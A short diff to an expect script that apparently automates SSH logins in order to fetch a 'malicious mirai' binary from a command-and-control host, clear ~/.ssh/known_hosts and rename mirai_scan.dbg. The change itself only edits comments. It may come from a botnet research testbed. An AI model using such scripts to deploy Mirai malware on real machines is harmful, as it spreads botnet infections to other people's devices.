@@ -26,7 +26,7 @@ expect " password: "
 send "$password\r"
 set timeout 60
 
-# download malicious 02_mirai file from cnc
+# download malicious 01_mirai file from cnc
 expect "*:~# "
 send "rm ~/.ssh/known_hosts\r"
 expect "*:~# "
@@ -37,7 +37,7 @@ expect " password: "
 send "$cnc_pass\r"
 set timeout 60
 
-# change 02_mirai name
+# change 01_mirai name
 expect "*:~# "
 send "mv -f $path/mirai_scan.dbg $path/mirai.dbg\r"
 
